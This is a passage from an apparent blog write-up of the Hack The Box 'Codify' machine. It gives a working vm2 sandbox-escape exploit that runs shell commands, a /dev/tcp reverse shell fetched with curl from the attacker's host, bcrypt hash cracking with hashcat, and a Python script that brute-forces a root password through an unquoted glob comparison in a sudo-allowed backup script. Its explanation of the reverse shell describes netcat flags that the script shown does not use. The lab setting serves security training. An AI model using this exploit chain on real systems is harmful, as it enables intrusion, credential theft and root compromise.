</code></pre></div></div> <p>In this code:</p> <ul> <li>A custom error object <code class="language-plaintext highlighter-rouge">err</code> and a <code class="language-plaintext highlighter-rouge">handler</code> are created with a method that triggers an error.</li> <li>A JavaScript feature called <code class="language-plaintext highlighter-rouge">Proxy</code> is used to intercept operations on the <code class="language-plaintext highlighter-rouge">err</code> object, specifically the <code class="language-plaintext highlighter-rouge">getPrototypeOf</code> operation, which is supposed to return an object’s prototype.</li> <li>In the <code class="language-plaintext highlighter-rouge">try...catch</code> block, the proxied error object is thrown. Due to the vulnerability, the <code class="language-plaintext highlighter-rouge">catch</code> block is manipulated to access Node.js’s core modules.</li> <li>The <code class="language-plaintext highlighter-rouge">child_process</code> module’s <code class="language-plaintext highlighter-rouge">execSync</code> function is then used to execute the <code class="language-plaintext highlighter-rouge">cat /etc/passwd</code> command, displaying the contents of the <code class="language-plaintext highlighter-rouge">/etc/passwd</code> file.</li> <li>This output is then logged to the console.</li> </ul> <p>Running this code in the page’s editor successfully returns the contents of the <code class="language-plaintext highlighter-rouge">/etc/passwd</code> file, demonstrating the breakout and arbitrary command execution.</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
<span class="nb">sync</span>:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System <span class="o">(</span>admin<span class="o">)</span>:/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:104::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:104:105:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
pollinate:x:105:1::/var/cache/pollinate:/bin/false
sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
syslog:x:107:113::/home/syslog:/usr/sbin/nologin
uuidd:x:108:114::/run/uuidd:/usr/sbin/nologin
tcpdump:x:109:115::/nonexistent:/usr/sbin/nologin
tss:x:110:116:TPM software stack,,,:/var/lib/tpm:/bin/false
landscape:x:111:117::/var/lib/landscape:/usr/sbin/nologin
usbmux:x:112:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
lxd:x:999:100::/var/snap/lxd/common/lxd:/bin/false
dnsmasq:x:113:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
joshua:x:1000:1000:,,,:/home/joshua:/bin/bash
svc:x:1001:1001:,,,:/home/svc:/bin/bash
fwupd-refresh:x:114:122:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
_laurel:x:998:998::/var/log/laurel:/bin/false
</code></pre></div></div> <h2 id="initial-access">Initial access</h2> <p>The objective now is to use the PoC to achieve <strong>remote code execution</strong> by manipulating the target to fetch a reverse shell.</p> <h3 id="staging">Staging</h3> <p>To achieve this a simple file containing a reverse shell can be created:</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/bin/bash</span>
sh <span class="nt">-i</span> <span class="o">&gt;</span>&amp; /dev/tcp/10.10.14.15/4321 0&gt;&amp;1
</code></pre></div></div> <p>The command has the following components:</p> <ul> <li><code class="language-plaintext highlighter-rouge">#!/bin/bash</code> is the shebang line that tells the system this is a Bash script.</li> <li><code class="language-plaintext highlighter-rouge">nc</code> is the Netcat command.</li> <li><code class="language-plaintext highlighter-rouge">10.10.14.15</code> is the IP address where your Netcat listener is running.</li> <li><code class="language-plaintext highlighter-rouge">4321</code> is the port on which your Netcat listener is listening.</li> <li><code class="language-plaintext highlighter-rouge">-e /bin/bash</code> tells Netcat to execute the <code class="language-plaintext highlighter-rouge">/bin/bash</code> shell upon connecting. This will give the listener shell access to the system running the script.</li> </ul> <p>The file is saved as <code class="language-plaintext highlighter-rouge">shell.sh</code>.</p> <p>The file can then be served with a simple webserver:</p> <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">python3</span> <span class="o">-</span><span class="n">m</span> <span class="n">http</span><span class="p">.</span><span class="n">server</span> <span class="mi">8080</span>
</code></pre></div></div> <p>The target can then be manipulated into fetching the shell by adding <code class="language-plaintext highlighter-rouge">curl http://10.10.14.15:8080/shell.sh -o shell</code> to the <code class="language-plaintext highlighter-rouge">execSync()</code> function in PoC like so:</p> <div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">const</span> <span class="p">{</span><span class="nx">VM</span><span class="p">}</span> <span class="o">=</span> <span class="nf">require</span><span class="p">(</span><span class="dl">"</span><span class="s2">vm2</span><span class="dl">"</span><span class="p">);</span>
<span class="kd">const</span> <span class="nx">vm</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">VM</span><span class="p">();</span>

<span class="kd">const</span> <span class="nx">code</span> <span class="o">=</span> <span class="s2">`
err = {};
const handler = {
    getPrototypeOf(target) {
        (function stack() {
            new Error().stack;
            stack();
        })();
    }
};
  
const proxiedErr = new Proxy(err, handler);
try {
    throw proxiedErr;
} catch ({constructor: c}) {
    c.constructor('return process')().mainModule.require('child_process').execSync('curl http://10.10.14.15:8080/shell.sh -o shell');
}
`</span>

<span class="nx">console</span><span class="p">.</span><span class="nf">log</span><span class="p">(</span><span class="nx">vm</span><span class="p">.</span><span class="nf">run</span><span class="p">(</span><span class="nx">code</span><span class="p">));</span>
</code></pre></div></div> <p>The python webserver confirms the file was successfully fetched:</p> <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">└──╼</span> <span class="p">[</span><span class="err">★</span><span class="p">]</span><span class="err">$</span> <span class="n">python3</span> <span class="o">-</span><span class="n">m</span> <span class="n">http</span><span class="p">.</span><span class="n">server</span> <span class="mi">8080</span>
<span class="n">Serving</span> <span class="n">HTTP</span> <span class="n">on</span> <span class="mf">0.0</span><span class="p">.</span><span class="mf">0.0</span> <span class="n">port</span> <span class="mi">8080</span> <span class="p">(</span><span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mf">0.0</span><span class="p">.</span><span class="mf">0.0</span><span class="p">:</span><span class="mi">8080</span><span class="o">/</span><span class="p">)</span> <span class="bp">...</span>
<span class="mf">10.129</span><span class="p">.</span><span class="mf">6.167</span> <span class="o">-</span> <span class="o">-</span> <span class="p">[</span><span class="mi">24</span><span class="o">/</span><span class="n">Jan</span><span class="o">/</span><span class="mi">2024</span> <span class="mi">05</span><span class="p">:</span><span class="mi">41</span><span class="p">:</span><span class="mi">48</span><span class="p">]</span> <span class="sh">"</span><span class="s">GET /shell.sh HTTP/1.1</span><span class="sh">"</span> <span class="mi">200</span> <span class="o">-</span>
</code></pre></div></div> <h3 id="exploitation-1">Exploitation</h3> <p>The next step is to make the file executable by sending <code class="language-plaintext highlighter-rouge">chmod +x shell</code> in the <code class="language-plaintext highlighter-rouge">execSync()</code> function.</p> <p>Then, after starting a <code class="language-plaintext highlighter-rouge">netcat</code>listener, the shell can be executed by sending <code class="language-plaintext highlighter-rouge">bash -x shell</code> to the target:</p> <div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">const</span> <span class="p">{</span><span class="nx">VM</span><span class="p">}</span> <span class="o">=</span> <span class="nf">require</span><span class="p">(</span><span class="dl">"</span><span class="s2">vm2</span><span class="dl">"</span><span class="p">);</span>
<span class="kd">const</span> <span class="nx">vm</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">VM</span><span class="p">();</span>

<span class="kd">const</span> <span class="nx">code</span> <span class="o">=</span> <span class="s2">`
err = {};
const handler = {
    getPrototypeOf(target) {
        (function stack() {
            new Error().stack;
            stack();
        })();
    }
};
  
const proxiedErr = new Proxy(err, handler);
try {
    throw proxiedErr;
} catch ({constructor: c}) {
    c.constructor('return process')().mainModule.require('child_process').execSync('bash -x shell');
}
`</span>

<span class="nx">console</span><span class="p">.</span><span class="nf">log</span><span class="p">(</span><span class="nx">vm</span><span class="p">.</span><span class="nf">run</span><span class="p">(</span><span class="nx">code</span><span class="p">));</span>
</code></pre></div></div> <p>The listener successfully captures the reverse shell:</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>└──╼ <span class="o">[</span>★]<span class="nv">$ </span>nc <span class="nt">-lnvp</span> 4321
Ncat: Version 7.93 <span class="o">(</span> https://nmap.org/ncat <span class="o">)</span>
Ncat: Listening on :::4321
Ncat: Listening on 0.0.0.0:4321
Ncat: Connection from 10.129.6.167.
Ncat: Connection from 10.129.6.167:44946.
sh: 0: can<span class="s1">'t access tty; job control turned off
$ whoami
svc
$ 
</span></code></pre></div></div> <h3 id="upgrading-the-shell">Upgrading the shell</h3> <p>The shell can then be upgraded for interactivity using:</p> <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">$</span> <span class="n">python3</span> <span class="o">-</span><span class="n">c</span> <span class="sh">"</span><span class="s">import pty;pty.spawn(</span><span class="sh">'</span><span class="s">/bin/bash</span><span class="sh">'</span><span class="s">)</span><span class="sh">"</span>

<span class="n">svc</span><span class="nd">@codify</span><span class="p">:</span><span class="o">/</span><span class="n">home</span><span class="err">$</span> 

</code></pre></div></div> <h2 id="lateral-movement">Lateral movement</h2> <p>Exploring the site’s <code class="language-plaintext highlighter-rouge">/www</code> directory in the root <code class="language-plaintext highlighter-rouge">/var</code> directory finds a <code class="language-plaintext highlighter-rouge">tickets.db</code> file.</p> <p>Catting this file finds a hash for the user <code class="language-plaintext highlighter-rouge">joshua</code>.</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>svc@codify:/var/www/contact<span class="nv">$ </span><span class="nb">cat </span>tickets.db
<span class="nb">cat </span>tickets.db
�T5��T�format 3@  .WJ
       otableticketsticketsCREATE TABLE tickets <span class="o">(</span><span class="nb">id </span>INTEGER PRIMARY KEY AUTOINCREMENT, name TEXT, topic TEXT, description TEXT, status TEXT<span class="o">)</span>P++Ytablesqlite_sequencesqlite_sequenceCREATE TABLE sqlite_sequence<span class="o">(</span>name,seq<span class="o">)</span>��	tableusersusersCREATE TABLE <span class="nb">users</span> <span class="o">(</span>
        <span class="nb">id </span>INTEGER PRIMARY KEY AUTOINCREMENT, 
        username TEXT UNIQUE, 
        password TEXT
��G�joshua<span class="nv">$2a$12$SOn8Pf6z8fO</span>/nVsNbAAequ/&lt;REDACTED&gt;/p/Zw2
��
����ua  <span class="nb">users
             </span>ickets
r]r�h%%�Joe WilliamsLocal setup?I use this site lot of the time. Is it possible to <span class="nb">set </span>this up locally? Like instead of coming to this site, can I download this and <span class="nb">set </span>it up <span class="k">in </span>my own computer? A feature like that would be nice.open� <span class="p">;</span>�wTom HanksNeed networking modulesI think it would be better <span class="k">if </span>you can implement a way to handle network-based stuff. Would <span class="nb">help </span>me out a lot. Thanks!opensvc@codify:/var/www/contact<span class="nv">$ </span>
</code></pre></div></div> <p>The hash appears to be a bcrypt hash.</p> <blockquote> <p><em>Bcrypt hashes are recognisable by their format, which usually starts with <code class="language-plaintext highlighter-rouge">$2a$</code>, <code class="language-plaintext highlighter-rouge">$2b$</code>, <code class="language-plaintext highlighter-rouge">$2x$</code>, or <code class="language-plaintext highlighter-rouge">$2y$</code> followed by a cost parameter (like <code class="language-plaintext highlighter-rouge">$12$</code> in your hash), and then the salt and hash value.</em></p> </blockquote> <p>The hash can be formatted for hashcat by dropping the username and adding it to a file (or passing it directly to the command).</p> <p>In Hashcat, the mode to use for cracking bcrypt hashes is <code class="language-plaintext highlighter-rouge">3200</code>:</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>hashcat <span class="nt">-m</span> 3200 hash.txt /usr/share/wordlists/rockyou.txt
hashcat <span class="o">(</span>v6.1.1<span class="o">)</span> starting...

OpenCL API <span class="o">(</span>OpenCL 1.2 LINUX<span class="o">)</span> - Platform <span class="c">#1 [Intel(R) Corporation]</span>
<span class="o">==================================================================</span>
<span class="k">*</span> Device <span class="c">#1: AMD EPYC 7543 32-Core Processor, 7855/7919 MB (1979 MB allocatable), 4MCU</span>

OpenCL API <span class="o">(</span>OpenCL 1.2 pocl 1.6, None+Asserts, LLVM 9.0.1, RELOC, SLEEF, DISTRO, POCL_DEBUG<span class="o">)</span> - Platform <span class="c">#2 [The pocl project]</span>
<span class="o">=============================================================================================================================</span>
<span class="k">*</span> Device <span class="c">#2: pthread-AMD EPYC 7543 32-Core Processor, skipped</span>

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 72

Hashes: 1 digests<span class="p">;</span> 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Applicable optimizers applied:
<span class="k">*</span> Zero-Byte
<span class="k">*</span> Single-Hash
<span class="k">*</span> Single-Salt

Watchdog: Hardware monitoring interface not found on your system.
Watchdog: Temperature abort trigger disabled.

Host memory required <span class="k">for </span>this attack: 65 MB

Dictionary cache built:
<span class="k">*</span> Filename..: /usr/share/wordlists/rockyou.txt
<span class="k">*</span> Passwords.: 14344392
<span class="k">*</span> Bytes.....: 139921507
<span class="k">*</span> Keyspace..: 14344385
<span class="k">*</span> Runtime...: 1 sec

</code></pre></div></div> <p>The hash cracks</p> <p><img src="/assets/img/2024-codify/20240125-codify-hash.png" alt="20240125-codify-hash.png" class="auto-resize"/></p> <p>With the acquired password, SSH can be used to authenticate to the target as the user <strong>joshua.</strong></p> <p>And the user flag is obtained.</p> <div class="language-ssh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">└──╼</span> <span class="err">[★]$</span> <span class="k">ssh</span> joshua@10.129.6.167
<span class="k">joshua</span>@codify:~<span class="err">$</span> ls
<span class="k">user</span>.txt
<span class="k">joshua</span>@codify:~<span class="err">$</span> cat user.txt 
&lt;REDACTED&gt;

</code></pre></div></div> <h2 id="privilege-escalation">Privilege escalation</h2> <p>A helpful check for privilege escalation is to review sudo permissions.</p> <p>Using <code class="language-plaintext highlighter-rouge">sudo -l</code> it can be seen that the user has sudo rights over the <code class="language-plaintext highlighter-rouge">/opt/scripts/mysql-backup.sh</code> file.</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>joshua@codify:~<span class="nv">$ </span><span class="nb">sudo</span> <span class="nt">-l</span>
<span class="o">[</span><span class="nb">sudo</span><span class="o">]</span> password <span class="k">for </span>joshua: 
Matching Defaults entries <span class="k">for </span>joshua on codify:
    env_reset, mail_badpass, <span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin<span class="se">\:</span>/snap/bin, use_pty

User joshua may run the following commands on codify:
    <span class="o">(</span>root<span class="o">)</span> /opt/scripts/mysql-backup.sh

</code></pre></div></div> <p>As the name suggests, the script is designed to back up MySQL databases.</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/bin/bash</span>
<span class="nv">DB_USER</span><span class="o">=</span><span class="s2">"root"</span>
<span class="nv">DB_PASS</span><span class="o">=</span><span class="si">$(</span>/usr/bin/cat /root/.creds<span class="si">)</span>
<span class="nv">BACKUP_DIR</span><span class="o">=</span><span class="s2">"/var/backups/mysql"</span>

<span class="nb">read</span> <span class="nt">-s</span> <span class="nt">-p</span> <span class="s2">"Enter MySQL password for </span><span class="nv">$DB_USER</span><span class="s2">: "</span> USER_PASS
/usr/bin/echo

<span class="k">if</span> <span class="o">[[</span> <span class="nv">$DB_PASS</span> <span class="o">==</span> <span class="nv">$USER_PASS</span> <span class="o">]]</span><span class="p">;</span> <span class="k">then</span>
        /usr/bin/echo <span class="s2">"Password confirmed!"</span>
<span class="k">else</span>
        /usr/bin/echo <span class="s2">"Password confirmation failed!"</span>
        <span class="nb">exit </span>1
<span class="k">fi</span>

/usr/bin/mkdir <span class="nt">-p</span> <span class="s2">"</span><span class="nv">$BACKUP_DIR</span><span class="s2">"</span>

<span class="nv">databases</span><span class="o">=</span><span class="si">$(</span>/usr/bin/mysql <span class="nt">-u</span> <span class="s2">"</span><span class="nv">$DB_USER</span><span class="s2">"</span> <span class="nt">-h</span> 0.0.0.0 <span class="nt">-P</span> 3306 <span class="nt">-p</span><span class="s2">"</span><span class="nv">$DB_PASS</span><span class="s2">"</span> <span class="nt">-e</span> <span class="s2">"SHOW DATABASES;"</span> | /usr/bin/grep <span class="nt">-Ev</span> <span class="s2">"(Database|information_schema|performance_schema)"</span><span class="si">)</span>

<span class="k">for </span>db <span class="k">in</span> <span class="nv">$databases</span><span class="p">;</span> <span class="k">do</span>
    /usr/bin/echo <span class="s2">"Backing up database: </span><span class="nv">$db</span><span class="s2">"</span>
    /usr/bin/mysqldump <span class="nt">--force</span> <span class="nt">-u</span> <span class="s2">"</span><span class="nv">$DB_USER</span><span class="s2">"</span> <span class="nt">-h</span> 0.0.0.0 <span class="nt">-P</span> 3306 <span class="nt">-p</span><span class="s2">"</span><span class="nv">$DB_PASS</span><span class="s2">"</span> <span class="s2">"</span><span class="nv">$db</span><span class="s2">"</span> | /usr/bin/gzip <span class="o">&gt;</span> <span class="s2">"</span><span class="nv">$BACKUP_DIR</span><span class="s2">/</span><span class="nv">$db</span><span class="s2">.sql.gz"</span>
<span class="k">done</span>

/usr/bin/echo <span class="s2">"All databases backed up successfully!"</span>
/usr/bin/echo <span class="s2">"Changing the permissions"</span>
/usr/bin/chown root:sys-adm <span class="s2">"</span><span class="nv">$BACKUP_DIR</span><span class="s2">"</span>
/usr/bin/chmod 774 <span class="nt">-R</span> <span class="s2">"</span><span class="nv">$BACKUP_DIR</span><span class="s2">"</span>
/usr/bin/echo <span class="s1">'Done!'</span>

</code></pre></div></div> <p>The script does the following:</p> <ol> <li><strong>Setting Variables:</strong> <ul> <li><code class="language-plaintext highlighter-rouge">DB_USER="root"</code>: Defines the database username, in this case, <code class="language-plaintext highlighter-rouge">root</code>.</li> <li><code class="language-plaintext highlighter-rouge">DB_PASS=$(/usr/bin/cat /root/.creds)</code>: Retrieves the MySQL root user’s password from a file located at <code class="language-plaintext highlighter-rouge">/root/.creds</code>.</li> </ul> </li> <li><strong>Password Confirmation:</strong> <ul> <li>The script prompts the user to enter the MySQL password for the root user. This is done securely (without echoing the input) using <code class="language-plaintext highlighter-rouge">read -s -p</code>.</li> <li>It then checks if the entered password (<code class="language-plaintext highlighter-rouge">USER_PASS</code>) matches the one stored in <code class="language-plaintext highlighter-rouge">/root/.creds</code> (<code class="language-plaintext highlighter-rouge">DB_PASS</code>). If they don’t match, the script prints an error message and exits.</li> </ul> </li> <li><strong>Creating Backup Directory:</strong> <ul> <li>The script ensures that the backup directory (<code class="language-plaintext highlighter-rouge">/var/backups/mysql</code>) exists, creating it if necessary with <code class="language-plaintext highlighter-rouge">mkdir -p</code>.</li> </ul> </li> <li><strong>Retrieving Database Names:</strong> <ul> <li>It retrieves a list of all databases (excluding <code class="language-plaintext highlighter-rouge">information_schema</code>, <code class="language-plaintext highlighter-rouge">performance_schema</code>, and the <code class="language-plaintext highlighter-rouge">Database</code> header) using a MySQL command. The list of databases is stored in the variable <code class="language-plaintext highlighter-rouge">databases</code>.</li> </ul> </li> <li><strong>Backing Up Each Database:</strong> <ul> <li>The script loops through each database in the <code class="language-plaintext highlighter-rouge">databases</code> variable.</li> <li>For each database (<code class="language-plaintext highlighter-rouge">db</code>), it performs a backup using <code class="language-plaintext highlighter-rouge">mysqldump</code> and compresses the output to a <code class="language-plaintext highlighter-rouge">.sql.gz</code> file in the backup directory. Each backup file is named after the database.</li> </ul> </li> <li><strong>Post-backup Steps:</strong> <ul> <li>After backing up all the databases, the script prints a success message.</li> <li>It then changes the ownership of the backup directory to the <code class="language-plaintext highlighter-rouge">root</code> user and <code class="language-plaintext highlighter-rouge">sys-adm</code> group.</li> <li>The script modifies the permissions of the backup directory and its contents to <code class="language-plaintext highlighter-rouge">774</code> (read/write/execute for owner and group, read for others).</li> <li>Finally, it prints ‘Done!’ to indicate completion.</li> </ul> </li> </ol> <p>In summary, this script is a utility for backing up all MySQL databases on a server. It first confirms that the user running the script knows the MySQL root password, then proceeds to back up each database to a specified directory, securing the backups with appropriate permissions and ownership.</p> <blockquote> <p><em>After a fair bit of research, I came across <a href="https://blnknlights.github.io/htb/machines/easy/codify/codify.html">this great write up</a> that put me onto a track without just giving me the answer.</em></p> </blockquote> <h3 id="shellcheck">Shellcheck</h3> <p>Using a utility called <code class="language-plaintext highlighter-rouge">shellcheck</code>, the <code class="language-plaintext highlighter-rouge">mysql-backup.sh</code> can be assessed:</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>└──╼ <span class="o">[</span>★]<span class="nv">$ </span>shellcheck shell.sh

In shell.sh line 6:
<span class="nb">read</span> <span class="nt">-s</span> <span class="nt">-p</span> <span class="s2">"Enter MySQL password for </span><span class="nv">$DB_USER</span><span class="s2">: "</span> USER_PASS
^--^ SC2162: <span class="nb">read </span>without <span class="nt">-r</span> will mangle backslashes.


In shell.sh line 9:
<span class="k">if</span> <span class="o">[[</span> <span class="nv">$DB_PASS</span> <span class="o">==</span> <span class="nv">$USER_PASS</span> <span class="o">]]</span><span class="p">;</span> <span class="k">then</span>
                  ^--------^ SC2053: Quote the right-hand side of <span class="o">==</span> <span class="k">in</span> <span class="o">[[</span> <span class="o">]]</span> to prevent glob matching.

For more information:
  https://www.shellcheck.net/wiki/SC2053 <span class="nt">--</span> Quote the right-hand side of <span class="o">==</span> i...
  https://www.shellcheck.net/wiki/SC2162 <span class="nt">--</span> <span class="nb">read </span>without <span class="nt">-r</span> will mangle backs...

</code></pre></div></div> <p>As shown, it gives the warning that:</p> <blockquote> <p>“<em>Quote the right-hand side of == in [[ ]] to prevent glob matching.</em>”</p> </blockquote> <h3 id="what-is-glob-matching">What is glob matching</h3> <p>Glob matching, in the context of shell scripts, refers to a feature where certain characters (like <code class="language-plaintext highlighter-rouge">*</code>, <code class="language-plaintext highlighter-rouge">?</code>, <code class="language-plaintext highlighter-rouge">[</code>, and <code class="language-plaintext highlighter-rouge">]</code>) are used as wildcards to match filenames or strings. This is commonly used in file operations but can also apply to string comparisons in conditional statements.</p> <p>In the script, <code class="language-plaintext highlighter-rouge">[[ $DB_PASS == $USER_PASS ]]</code> doesn’t quote <code class="language-plaintext highlighter-rouge">$USER_PASS</code>, which means the shell tries to perform glob matching instead of matching the literal string with the value of <code class="language-plaintext highlighter-rouge">$USER_PASS</code>. This means:</p> <ul> <li>If <code class="language-plaintext highlighter-rouge">$USER_PASS</code> contains a <code class="language-plaintext highlighter-rouge">*</code>, it could match any string of characters.</li> <li>If <code class="language-plaintext highlighter-rouge">$USER_PASS</code> contains a <code class="language-plaintext highlighter-rouge">?</code>, it could match any single character.</li> <li>If <code class="language-plaintext highlighter-rouge">$USER_PASS</code> contains <code class="language-plaintext highlighter-rouge">[</code> and <code class="language-plaintext highlighter-rouge">]</code>, it could match any characters inside the brackets.</li> </ul> <p>This behaviour can lead to unexpected results or security vulnerabilities. For instance, if <code class="language-plaintext highlighter-rouge">$USER_PASS</code> somehow contains <code class="language-plaintext highlighter-rouge">*</code>, the condition might unexpectedly evaluate to true.</p> <p>To prevent glob matching and ensure the script is comparing the actual string value of <code class="language-plaintext highlighter-rouge">$USER_PASS</code> with <code class="language-plaintext highlighter-rouge">$DB_PASS</code>, you should quote <code class="language-plaintext highlighter-rouge">$USER_PASS</code>:</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">if</span> <span class="o">[[</span> <span class="nv">$DB_PASS</span> <span class="o">==</span> <span class="s2">"</span><span class="nv">$USER_PASS</span><span class="s2">"</span> <span class="o">]]</span><span class="p">;</span> <span class="k">then</span>
    ...
<span class="k">fi</span>

</code></pre></div></div> <p>This change ensures that the value of <code class="language-plaintext highlighter-rouge">$USER_PASS</code> is taken literally, without any glob matching.</p> <h3 id="brute-forcing-the-password">Brute-forcing the password</h3> <p>With the help of ChatGPT, the following script can brute force the password by glob matching the next character iteratively.</p> <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="n">string</span>
<span class="kn">import</span> <span class="n">subprocess</span>

<span class="k">def</span> <span class="nf">attempt_password</span><span class="p">(</span><span class="n">current_password</span><span class="p">):</span>
    <span class="k">try</span><span class="p">:</span>
        <span class="c1"># Execute the password check command
</span>        <span class="n">command</span> <span class="o">=</span> <span class="sa">f</span><span class="sh">"</span><span class="s">echo </span><span class="sh">'</span><span class="si">{</span><span class="n">current_password</span><span class="si">}</span><span class="s">*</span><span class="sh">'</span><span class="s"> | sudo /opt/scripts/mysql-backup.sh</span><span class="sh">"</span>
        <span class="n">output</span> <span class="o">=</span> <span class="n">subprocess</span><span class="p">.</span><span class="nf">check_output</span><span class="p">(</span>
            <span class="n">command</span><span class="p">,</span>
            <span class="n">shell</span><span class="o">=</span><span class="bp">True</span><span class="p">,</span>
            <span class="n">stderr</span><span class="o">=</span><span class="n">subprocess</span><span class="p">.</span><span class="n">STDOUT</span><span class="p">,</span>
            <span class="n">text</span><span class="o">=</span><span class="bp">True</span>
        <span class="p">)</span>
        <span class="k">return</span> <span class="sh">"</span><span class="s">Password confirmed!</span><span class="sh">"</span> <span class="ow">in</span> <span class="n">output</span>
    <span class="k">except</span> <span class="n">subprocess</span><span class="p">.</span><span class="n">CalledProcessError</span><span class="p">:</span>
        <span class="k">return</span> <span class="bp">False</span>

<span class="n">all_chars</span> <span class="o">=</span> <span class="n">string</span><span class="p">.</span><span class="n">ascii_letters</span> <span class="o">+</span> <span class="n">string</span><span class="p">.</span><span class="n">digits</span>
<span class="n">password</span> <span class="o">=</span> <span class="sh">""</span>

<span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
    <span class="k">for</span> <span class="n">char</span> <span class="ow">in</span> <span class="n">all_chars</span><span class="p">:</span>
        <span class="k">if</span> <span class="nf">attempt_password</span><span class="p">(</span><span class="n">password</span> <span class="o">+</span> <span class="n">char</span><span class="p">):</span>
            <span class="n">password</span> <span class="o">+=</span> <span class="n">char</span>
            <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">Current Password: </span><span class="si">{</span><span class="n">password</span><span class="si">}</span><span class="sh">"</span><span class="p">)</span>
            <span class="k">break</span>
    <span class="k">else</span><span class="p">:</span>
        <span class="c1"># Exit the loop if no additional character matches
</span>        <span class="k">break</span>

<span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">Final Password: </span><span class="si">{</span><span class="n">password</span><span class="si">}</span><span class="sh">"</span> <span class="k">if</span> <span class="n">password</span> <span class="k">else</span> <span class="sh">"</span><span class="s">Password not found.</span><span class="sh">"</span><span class="p">)</span>

</code></pre></div></div> <p>With the globbed password, and switching to the <strong>root</strong> user, the final flag is captured.</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>joshua@codify:~<span class="nv">$ </span>su root
Password: 
root@codify:/home/joshua# <span class="nb">cd</span> ~
root@codify:~# <span class="nb">ls
</span>root.txt  scripts
root@codify:~# <span class="nb">cat </span>root.txt 
&lt;REDACTED&gt;
root@codify:~# 

</code></pre></div></div>]]></content><author><name></name></author><category term="HTB-Machines"/><category term="easy-box"/><category term="HTB"/><category term="arbitrary-code-execution"/><category term="ace"/><category term="remote-code-exeuction"/><category term="rce"/><category term="glob"/><category term="globbing"/><category term="secure-coding"/><category term="insecure-coding"/><category term="node.js"/><summary type="html"><![CDATA[Codify - Hack The Box walkthrough.]]></summary></entry></feed>